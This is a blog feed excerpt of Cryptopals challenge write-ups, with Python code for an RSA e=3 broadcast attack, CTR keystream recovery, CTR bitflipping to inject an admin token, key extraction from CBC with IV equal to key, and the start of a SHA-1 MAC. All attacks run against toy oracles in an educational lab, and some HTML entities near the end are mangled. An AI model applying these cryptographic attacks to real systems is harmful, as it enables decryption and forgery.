<p>The solution to this problem lies with the <a href="https://crypto.stanford.edu/pbc/notes/numbertheory/crt.html">Chinese Remainder Theorem</a>.</p>
<p>We need the same plaintext encrypted with different public keys to recover the plaintext. According to the paper, for </p>
<p><em>C¹ = m³ mod n¹</em>, <em>C² = m² mod n²</em> and <em>C³ = m³ mod n³</em>,</p>
<p>    ⇨ <em>C&rsquo; = m³ mod n¹n²n³</em></p>
<p>Therefore, if are able to calculate <em>C&rsquo;</em>, we can just cube root it to get the solution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">RSA_Broadcast_Attack</span>(message: bytes, rsa0: object, rsa1: object, rsa2: object) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Uses the Chinese Remainder Theorem (CRT) to break e=3 RSA given three ciphertexts of the same plaintext.
</span><span style="color:#e6db74">    This attack could be easily coded to work also when a different number of ciphertexts is provided.
</span><span style="color:#e6db74">    Check here for reference: https://crypto.stanford.edu/pbc/notes/numbertheory/crt.html
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>

    <span style="color:#75715e"># Obtain the N from the public keys of the RSA objects.</span>
    n0 <span style="color:#f92672">=</span> rsa0<span style="color:#f92672">.</span>pub[<span style="color:#ae81ff">1</span>]
    n1 <span style="color:#f92672">=</span> rsa1<span style="color:#f92672">.</span>pub[<span style="color:#ae81ff">1</span>]
    n2 <span style="color:#f92672">=</span> rsa2<span style="color:#f92672">.</span>pub[<span style="color:#ae81ff">1</span>]
    
    <span style="color:#75715e"># Encrypt the integer of the message via all three RSA objects.</span>
    plainnum <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(message, <span style="color:#e6db74">&#34;big&#34;</span>)
    c0 <span style="color:#f92672">=</span> rsa0<span style="color:#f92672">.</span>encryptnum(plainnum)
    c1 <span style="color:#f92672">=</span> rsa1<span style="color:#f92672">.</span>encryptnum(plainnum)
    c2 <span style="color:#f92672">=</span> rsa2<span style="color:#f92672">.</span>encryptnum(plainnum)
    
    <span style="color:#75715e"># Can&#39;t do N/n0 for ms0 instead because floating point operations arent accurate</span>
    N <span style="color:#f92672">=</span> n0 <span style="color:#f92672">*</span> n1 <span style="color:#f92672">*</span> n2
    ms0 <span style="color:#f92672">=</span> n1 <span style="color:#f92672">*</span> n2
    ms1 <span style="color:#f92672">=</span> n0 <span style="color:#f92672">*</span> n2
    ms2 <span style="color:#f92672">=</span> n0 <span style="color:#f92672">*</span> n1
    
    r0 <span style="color:#f92672">=</span> (c0 <span style="color:#f92672">*</span> ms0 <span style="color:#f92672">*</span> mod_inverse(ms0, n0))
    r1 <span style="color:#f92672">=</span> (c1 <span style="color:#f92672">*</span> ms1 <span style="color:#f92672">*</span> mod_inverse(ms1, n1))
    r2 <span style="color:#f92672">=</span> (c2 <span style="color:#f92672">*</span> ms2 <span style="color:#f92672">*</span> mod_inverse(ms2, n2))
    
    R <span style="color:#f92672">=</span> (r0 <span style="color:#f92672">+</span> r1 <span style="color:#f92672">+</span> r2) <span style="color:#f92672">%</span> N
    m <span style="color:#f92672">=</span> floorRoot(R, <span style="color:#ae81ff">3</span>)
    
    <span style="color:#66d9ef">return</span> m<span style="color:#f92672">.</span>to_bytes((m<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">//</span> <span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;This is RSA Broadcast Attack&#34;</span>
RSA_Broadcast_Attack(message<span style="color:#f92672">.</span>encode(), RSA(<span style="color:#ae81ff">256</span>), RSA(<span style="color:#ae81ff">256</span>), RSA(<span style="color:#ae81ff">256</span>))<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</code></pre></div><p><code>&quot;This is RSA Broadcast Attack&quot;</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


]]></content>
        </item>
        
        <item>
            <title>Set 4</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/27/set-4/</link>
            <pubDate>Fri, 27 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/27/set-4/</guid>
            <description>Refer to this repository for solution scripts and the IPython Notebook pertaining to the explanations here.
Challenge 25: Break &amp;ldquo;random access read/write&amp;rdquo; AES CTR Link
 Back to CTR. Encrypt the recovered plaintext from this file (the ECB exercise) under CTR with a random key (for this exercise the key should be unknown to you, but hold on to it).
Now, write the code that allows you to &amp;ldquo;seek&amp;rdquo; into the ciphertext, decrypt, and re-encrypt with different plaintext.</description>
            <content type="html"><![CDATA[<p>Refer to this <a href="https://github.com/hexterisk/cryptopals-solutions">repository</a> for solution scripts and the IPython Notebook pertaining to the explanations here.</p>
<h3 id="challenge-25-break-random-access-readwrite-aes-ctr">Challenge 25: Break &ldquo;random access read/write&rdquo; AES CTR</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/25">Link</a></p>
<blockquote>
<p>Back to CTR. Encrypt the recovered plaintext from <a href="https://cryptopals.com/static/challenge-data/25.txt">this file</a> (the ECB exercise) under CTR with a random key (for this exercise the key should be unknown to you, but hold on to it).</p>
<p>Now, write the code that allows you to &ldquo;seek&rdquo; into the ciphertext, decrypt, and re-encrypt with different plaintext. Expose this as a function, like, <em>&ldquo;edit(ciphertext, key, offset, newtext)&quot;</em>.</p>
<p>Imagine the &ldquo;edit&rdquo; function was exposed to attackers by means of an API call that didn&rsquo;t reveal the key or the original plaintext; the attacker has the ciphertext and controls the offset and &ldquo;new text&rdquo;.</p>
<p>Recover the original plaintext.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> base64
<span style="color:#f92672">import</span> itertools
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;25.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)<span style="color:#f92672">.</span>read()
</code></pre></div><p>We have already established the fact that xoring multiple strings with the same keystream is a very bad idea.</p>
<p>Now, the fact that CTR allows us to seek into the ciphertext, we can use it to our advantage to manipulate the ciphertext. We can encrypt our own text with the same keystream and then replace the bytes at the indices specified to be modified/overwritten.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(ciphertext: bytes, key: bytes, offset: int, newtext: bytes, nonce: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Seek into the ciphertext at the given offset and edit the ciphertext to add the newtext&#39;s cipher at the offset.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    keystream <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
    <span style="color:#75715e"># Obtain the keystream used to encrypt in the AES CTR Mode.</span>
    <span style="color:#75715e"># Encrypting newtext to be inserted at offset requires CTR keystream at that offset too.</span>
    stream <span style="color:#f92672">=</span> CTR_keystream_generator(key, nonce)
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>islice(stream, offset, offset<span style="color:#f92672">+</span>len(newtext)):
        keystream <span style="color:#f92672">+=</span> i<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)
    
    <span style="color:#75715e"># Get the cipher for newtext.</span>
    append_cipher <span style="color:#f92672">=</span> xor_bytes(newtext, keystream)
    
    <span style="color:#75715e"># Append the cipher of newtext to original cipher.</span>
    result <span style="color:#f92672">=</span> ciphertext[:offset] <span style="color:#f92672">+</span> append_cipher
    <span style="color:#66d9ef">if</span> len(result) <span style="color:#f92672">&lt;</span> len(ciphertext):
        <span style="color:#66d9ef">return</span> result <span style="color:#f92672">+</span> ciphertext[len(result):]
    <span style="color:#66d9ef">return</span> result
</code></pre></div><p>Test the edit function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;hello there&#34;</span>
cipher <span style="color:#f92672">=</span> CTR(plaintext, random_key, nonce)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Original text:&#34;</span>, CTR(cipher, random_key, nonce)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
edited_cipher <span style="color:#f92672">=</span> edit(cipher, random_key, <span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;####&#34;</span>, nonce)
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Edited text:&#34;</span>, CTR(edited_cipher, random_key, nonce)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
</code></pre></div><p><code>Original text: hello there</code><br>
<code>Edited text: hell####ere</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># If you give text as \x00 it gives out keystream, xors keystream with 0 and thus can decode keystream </span>
<span style="color:#75715e"># by using offset as 0.</span>
recovered_bytes <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(data)

random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

ciphertext <span style="color:#f92672">=</span> CTR(recovered_bytes, random_key, nonce)
recovered_keystream <span style="color:#f92672">=</span> edit(ciphertext, random_key, <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>len(ciphertext), nonce)
deciphered_bytes <span style="color:#f92672">=</span> xor_bytes(ciphertext, recovered_keystream)
</code></pre></div>

<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-26-ctr-bitflipping">Challenge 26: CTR bitflipping</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/26">Link</a></p>
<blockquote>
<p>There are people in the world that believe that CTR resists bit flipping attacks of the kind to which CBC mode is susceptible.<br>
Re-implement <a href="https://cryptopals.com/sets/2/challenges/16">the CBC bitflipping exercise from earlier</a> to use CTR mode instead of CBC mode. Inject an &ldquo;admin=true&rdquo; token.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
prepend_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;comment1=cooking%20MCs;userdata=&#34;</span>
append_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;;comment2=</span><span style="color:#e6db74">%20li</span><span style="color:#e6db74">ke%20a%20pound</span><span style="color:#e6db74">%20o</span><span style="color:#e6db74">f%20bacon&#34;</span>
</code></pre></div><p>Function to prepend the URL encoded string to text and encrypt it with CTR.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptor</span>(text: bytes, key: bytes, nonce: int) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Prepends the string to given text and encrypts with CTR.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    plaintext <span style="color:#f92672">=</span>  (prepend_string<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> text <span style="color:#f92672">+</span> append_string<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#34;;&#34;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#34;=&#34;&#39;</span>)
    ciphertext <span style="color:#f92672">=</span> CTR(plaintext, key, nonce)
    <span style="color:#66d9ef">return</span> ciphertext
</code></pre></div><p>Function to decrypt the cipihertext and check if &ldquo;admin=true&rdquo; is present.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decryptor</span>(byte_string: bytes, random_key: bytes, nonce: int) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypts the ciphertext via AES CTR Mode and checks if admin is set to true.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    decrypted_string <span style="color:#f92672">=</span> CTR(byte_string, random_key, nonce)
    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;admin=true;&#39;</span> <span style="color:#f92672">in</span> decrypted_string:
        <span style="color:#66d9ef">return</span> True
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> False
</code></pre></div><p>We find out the common prefix length so as to get the length of the prepended string. We then seek to the index where our inserted text starts, we flip the bits through the xor operation and modify the ciphertext so that when it is decrypted, it reads “admin=true” somewhere in it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">target_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;;admin=true;&#34;</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(<span style="color:#ae81ff">16</span>)
nonce <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>

modified_string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#75715e"># we take out prefix length and then combine the recovered</span>
<span style="color:#75715e"># keystream from that offset onwards with inut text to produce</span>
<span style="color:#75715e"># the required string</span>
prefix_length <span style="color:#f92672">=</span> len(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>commonprefix([encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;AAAA&#39;</span>, random_key, nonce), encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>, random_key, nonce)]))
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Prefix length: &#34;</span>, prefix_length)

dummy_input <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;heytheremama&#34;</span>
ciphertext <span style="color:#f92672">=</span> encryptor(dummy_input, random_key, nonce)
null_cipher <span style="color:#f92672">=</span> encryptor(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>len(ciphertext), random_key, nonce)
recovered_keystream <span style="color:#f92672">=</span> null_cipher[prefix_length:len(ciphertext)]

injected_bytes <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(target_bytes)):
    injected_bytes <span style="color:#f92672">+=</span> (target_bytes[i] <span style="color:#f92672">^</span> recovered_keystream[i])<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;big&#34;</span>)

modified_ciphertext <span style="color:#f92672">=</span> ciphertext[:prefix_length] <span style="color:#f92672">+</span> injected_bytes <span style="color:#f92672">+</span> ciphertext[prefix_length <span style="color:#f92672">+</span> len(injected_bytes):]
</code></pre></div><p><code>Prefix length:  38</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-27-recover-the-key-from-cbc-with-ivkey">Challenge 27: Recover the key from CBC with IV=Key</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/27">Link</a></p>
<blockquote>
<p>Take your code from the CBC exercise and modify it so that it repurposes the key for CBC encryption as the IV.<br>
Applications sometimes use the key as an IV on the auspices that both the sender and the receiver have to know the key already, and can save some space by using it as both a key and an IV.<br>
Using the key as an IV is insecure; an attacker that can modify ciphertext in flight can get the receiver to decrypt a value that will reveal the key.<br>
The CBC code from exercise 16 encrypts a URL string. Verify each byte of the plaintext for ASCII compliance (ie, look for high-ASCII values). Noncompliant messages should raise an exception or return an error that includes the decrypted plaintext (this happens all the time in real systems, for what it&rsquo;s worth).<br>
Use your code to encrypt a message that is at least 3 blocks long:<br>
<strong>AES-CBC(P_1, P_2, P_3) -&gt; C_1, C_2, C_3</strong><br>
Modify the message (you are now the attacker):<br>
<strong>C_1, C_2, C_3 -&gt; C_1, 0, C_1</strong><br>
Decrypt the message (you are now the receiver) and raise the appropriate error if high-ASCII is found.<br>
As the attacker, recovering the plaintext from the error, extract the key:<br>
<strong>P&rsquo;_1 XOR P&rsquo;_3</strong></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Given</span>
prepend_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;comment1=cooking%20MCs;userdata=&#34;</span>
append_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;;comment2=</span><span style="color:#e6db74">%20li</span><span style="color:#e6db74">ke%20a%20pound</span><span style="color:#e6db74">%20o</span><span style="color:#e6db74">f%20bacon&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_ascii_compliance</span>(plaintext: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns true if all the characters of plaintext are ASCII compliant (ie are in the ASCII table).
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> all(c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">128</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> plaintext)
</code></pre></div><p>NOTE: The specifications of this function are to be paid attention to. The attack is only possible if the oracle gives a feedback on the decrypted bytes being ASCII compliant, as well as returning the decrypted bytes if they aren&rsquo;t.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encryptor</span>(text: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bytes:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Encrypts the text with AES CBC Mode.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    plaintext <span style="color:#f92672">=</span> text<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#34;;&#34;&#39;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#34;=&#34;&#39;</span>)
    ciphertext <span style="color:#f92672">=</span> AES_CBC_encrypt(PKCS7_pad(plaintext, len(key)), IV, key)
    <span style="color:#66d9ef">return</span> ciphertext
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decryptor</span>(byte_string: bytes, IV: bytes, key: bytes) <span style="color:#f92672">-&gt;</span> bool:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Decrypts the ciphertext via AES CBC Mode and checks if all characters are ASCII.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    decrypted_string <span style="color:#f92672">=</span> AES_CBC_decrypt(byte_string, IV, key)
    <span style="color:#66d9ef">print</span>(len(decrypted_string), decrypted_string)
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> check_ascii_compliance(decrypted_string):
        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(decrypted_string)
</code></pre></div><p>Given K(key) = IV, and that we&rsquo;re in control of the cipher blocks being sent for decryption,</p>
<p>    ⇨ P¹ = Decrypt(C¹) ⊕ K </p>
<p>Here, since we know the plaintext and the ciphertext, if we get the intermediate state of decryption of C¹ block (ie Decrypt(C¹)), we can xor it with P¹ to get the K.</p>
<p>Now, feeding C¹ as the (i-1)th block for decryption to a random block Cⁱ, we get:</p>
<p>    ⇨ Pⁱ⁺¹ = Decrypt(C¹) ⊕ Cⁱ</p>
<p>If Cⁱ = 0,</p>
<p>    ⇨ Pⁱ⁺¹ = Decrypt(C¹), which would give us the intermediate state of decryption of C¹ block (ie Decrypt(C¹)).</p>
<p>Therefore, the attack is crafted as follows:</p>
<ol>
<li>Pick a ciphertext block to focus on. Call it C¹ for simplicity.</li>
<li>Send C¹ || 0 || C1 to the decryption oracle.</li>
<li>Compute the key as K = P¹ ⊕ C¹.</li>
</ol>
<p>Now, since the oracle checks the output for ASCII compliance, and in fact does send us the supposedly decrypted bytes when it&rsquo;s non-ASCII compliant, we can thus receive the key as it gets decrypted. If the decrypted bytes happens to pass the ASCII check, pick a different cipher block to begin with.</p>
<p><img src="/Cryptopals_Set_4/image.png" alt="&ldquo;CBC_decryption&rdquo;">
<em>AES CBC Decryption (3 blocks).</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">keysize <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
random_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>urandom(keysize)
IV <span style="color:#f92672">=</span> random_key

plaintext <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;lorem=ipsum;test=fun;padding=dull&#34;</span>
ciphertext <span style="color:#f92672">=</span> encryptor(plaintext, IV, random_key)
c1 <span style="color:#f92672">=</span> ciphertext[:keysize]
c2 <span style="color:#f92672">=</span> ciphertext[keysize:<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>keysize]
c3 <span style="color:#f92672">=</span> ciphertext[<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>keysize:]

<span style="color:#66d9ef">try</span>:
    decryptor(c1 <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> c1, IV, random_key)
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
    decrypted_string <span style="color:#f92672">=</span> str(e)<span style="color:#f92672">.</span>encode()
    p1 <span style="color:#f92672">=</span> decrypted_string[:keysize]
    p3 <span style="color:#f92672">=</span> decrypted_string[<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>keysize:]
    decrypted_key <span style="color:#f92672">=</span> xor_bytes(p1, p3)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt; Key found to be:&#34;</span>, decrypted_key)
</code></pre></div><p><code>57 b'lorem&quot;=&quot;ipsum&quot;;&quot;W\xc3\x9b\xc3\xb8]\xc3\x95;l=|}W`VK\xc2\xb1(;h\xc2\x86\x06uL\xc3\xacV\xc3\x87\xc2\x97~:4\xc3\x88\x00l'</code><br>
<code>&gt; Key found to be: b'\x1aET2.\x1d\x0e\x11aZPEH\x19P^'</code></p>


<div style="border:1px solid #c3e6cb;padding:.75rem 3rem;border-radius:.5rem;font-weight:bold;text-align: center;background-color:#d4edda;color:#155724;border-color:#c3e6cb;">Completed</div>


<h3 id="challenge-28-implement-a-sha-1-keyed-mac">Challenge 28: Implement a SHA-1 keyed MAC</h3>
<p><a href="https://cryptopals.com/sets/4/challenges/28">Link</a></p>
<blockquote>
<p>Find a SHA-1 implementation in the language you code in.<br>
Write a function to authenticate a message under a secret key by using a secret-prefix MAC, which is simply:<br>
<strong>SHA1(key || message)</strong><br>
Verify that you cannot tamper with the message without breaking the MAC you&rsquo;ve produced, and that you can&rsquo;t produce a new MAC without knowing the secret key.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Imports</span>
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> hashlib
</code></pre></div><p><strong>MAC</strong> (<strong>Message Authentication Code</strong>) works towards an integrity/authenticity check for a message. It can be computed on the sender&rsquo;s side, and sent with the message. The receiver, on reception of the message, can compute it and verify it with the MAC received to verify that the message is authentic, and hasn&rsquo;t been tampered with.</p>
<p>The implementation of the function is as follows:</p>
<p>SHA-1 works on 512 bit blocks. For a given input message <em>m</em>, it first appends some bits (at least 65, at most 576) so that the total length is a multiple of 512. Let&rsquo;s call <em>p</em> the added bits (that&rsquo;s the padding). The padded message is now <em>m||p</em> and is processed in the form of 512-bit blocks. It uses an internal <a href="https://stackedit.io/%5Bhttps://en.wikipedia.org/wiki/One-way_compression_function">compression function</a> (traditional name because it transforms two fixed-length inputs, the message and the key, into a fixed-length output, the MAC) and maintains a <strong>running state</strong> consisting of five 32-bit words. The compression function takes as input two values of 160 bits(the running state) and 512 bits(the padded message block), respectively, and outputs 160 bits(final MAC). The processing goes like this:</p>
<ul>
<li>The running state is initialized to a fixed, conventional value (which is given in the <a href="http://csrc.nist.gov/publications/fips/fips180-4/fips-180-4.pdf">SHA-1 specification</a>).</li>
<li>For each input block, the compression function is evaluated, with as input the current running state, and the input block; the output of the function is the new running state.</li>
<li>The running state after processing the last block is the hash output.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">left_rotate</span>(value: int, shift: int) <span style="color:#f92672">-&gt;</span> int:
    <span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">    Returns value left-rotated by shift bits. In other words, performs a circular shift to the left.
</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
    <span style="color:#66d9ef">return</span> ((value <span style="color:#f92672">&lt;&lt;</span> shift) <span style="color:#f92672">&amp;</span>amp;amp;amp;amp;amp;amp; <span style="color:#ae81ff">0xffffffff</span>) <span style="color:#f92672">|</span> (value <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> shift))


